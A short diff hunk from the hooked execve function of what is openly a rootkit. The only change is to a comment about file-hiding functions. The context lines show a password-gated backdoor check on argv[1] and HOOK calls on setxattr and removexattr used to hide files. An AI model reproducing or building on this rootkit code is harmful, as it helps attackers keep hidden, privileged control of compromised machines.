@@ -30,7 +30,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
             // is in fact the fully authorized owner of the rootkit. allow them access to the execve commands :)
             if(!strcmp(argv[1], execve_pw))
             {
-                // the three functions relative to file hiding
+                // the TWO functions relative to file hiding
                 HOOK(old_setxattr, CSETXATTR);
                 HOOK(old_removexattr, CREMOVEXATTR);
 
